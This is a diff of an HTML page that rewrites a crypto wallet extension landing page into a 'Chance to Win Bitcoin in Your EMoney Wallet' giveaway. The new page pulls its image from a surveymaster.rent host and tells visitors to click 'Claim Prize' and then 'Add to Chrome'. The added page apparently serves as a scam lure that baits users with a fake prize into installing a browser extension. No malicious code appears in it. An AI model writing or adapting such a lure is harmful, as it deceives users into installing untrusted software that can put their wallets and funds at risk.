@@ -3,67 +3,74 @@
 <head>
   <meta charset="UTF-8">
   <meta name="viewport" content="width=device-width, initial-scale=1.0">
-  <title>BLOCKCHAIN Made Easy</title>
-  <link href="https://stackpath.bootstrapcdn.com/bootstrap/4.5.2/css/bootstrap.min.css" rel="stylesheet">
+  <title>Responsive Page with Bootstrap</title>
+  <link rel="stylesheet" href="https://maxcdn.bootstrapcdn.com/bootstrap/4.5.2/css/bootstrap.min.css">
   <style>
-    .heading {
+    /* Center heading */
+    .center-heading {
       text-align: center;
-      margin-top: 50px;
-      margin-bottom: 30px;
+      margin-top: 20px;
     }
-    .card-img-top {
-      height: 300px;
-      object-fit: cover;
+    /* Center image */
+    .center-image {
+      display: flex;
+      justify-content: center;
+      align-items: center;
+      margin-top: 20px;
     }
-    .card {
-      margin-bottom: 20px;
+    /* Center content */
+    .center-content {
+      text-align: left;
     }
-    .bottom-button {
-      text-align: center;
-      margin-top: 50px;
+    /* Center button */
+    .center-button {
+      display: flex;
+      justify-content: center;
+      margin-top: 20px;
     }
   </style>
 </head>
 <body>
 
 <div class="container">
-  <h1 class="heading">Everything in the blockchain made easy</h1>
-  <h4 class="heading">Access your Digital assets across multiple networks with a secure crypto Wallet.</h4>
-  <h4 class="heading">The Scallop Extension is a multi-chain crypto wallet that serves as a gateway to thousands of web3 decentralized applications (dApps).</h4>
+  <div class="row">
+    <div class="col-sm-12">
+      <!-- Centered heading -->
+      <h1 class="center-heading">Chance to Win Bitcoin in Your EMoney Wallet</h1>
+    </div>
+  </div>
+  
+  <div class="row">
+    <div class="col-sm-12">
+      <!-- Centered image -->
+      <div class="center-image">
+        <img src="https://pin.surveymaster.rent/emoney/img/bit.jpg" class="img-fluid" alt="Bitcoin Image">
+      </div>
+    </div>
+  </div>
 
   <div class="row">
-    <div class="col-md-4">
-      <div class="card">
-        <img src="https://t3.ftcdn.net/jpg/03/27/97/96/360_F_327979651_8nYIqRZE5RaYCs0f2KdXTAG1sdfRmgEl.jpg" class="card-img-top" alt="Blockchain Image">
-      </div>
-    </div>
-    <div class="col-md-4">
-      <div class="card">
-        <img src="https://img.freepik.com/premium-vector/bitcoin-cryptocurrency-with-pile-coins-smartphone_73426-504.jpg" class="card-img-top" alt="Bitcoin Image">
-      </div>
-    </div>
-    <div class="col-md-4">
-      <div class="card">
-        <img src="https://mir-s3-cdn-cf.behance.net/projects/404/de7692188195337.Y3JvcCw4MDgsNjMyLDAsMA.png" class="card-img-top" alt="Crypto Image">
+    <div class="col-sm-12">
+      <!-- Content -->
+      <div class="center-content">
+        <ul>
+          <li>🎉 You have a chance to add free Bitcoin to your EMoney wallet.</li>
+          <li>🌐 Use this cryptocurrency anywhere you want.</li>
+          <li>🎁 Click on the "Claim Prize" button.</li>
+          <li>➕ Then click on the "Add to Chrome" button.</li>
+        </ul>
       </div>
     </div>
   </div>
 
-  <div class="card">
-    <div class="card-body">
-      <h4 class="heading">The Scallop Wallet Extension supports both fiat & crypto and has proper multi-chain support for Ethereum and all EVM chains such as Polygon and Binance Smart Chain.</h4>
-      <p>You can use the Scallop wallet extension to:</p>
-      <ul>
-        <li>Transform your desktop browser into a powerful self-custody web3 wallet and portal to thousands of decentralized applications in an instant.</li>
-        <li>Safely store and receive cryptocurrency from family and friends as well as your exchange account.</li>
-      </ul>
+  <div class="row">
+    <div class="col-sm-12">
+      <!-- Centered button -->
+      <div class="center-button">
+        <a href="https://example.com/" class="btn btn-primary">Claim Prize</a>
+      </div>
     </div>
   </div>
-
-  <div class="bottom-button">
-    <a href="https://www.google.com/" class="btn btn-primary">Add to Chrome</a>
-  </div>
-
 </div>
 
 </body>
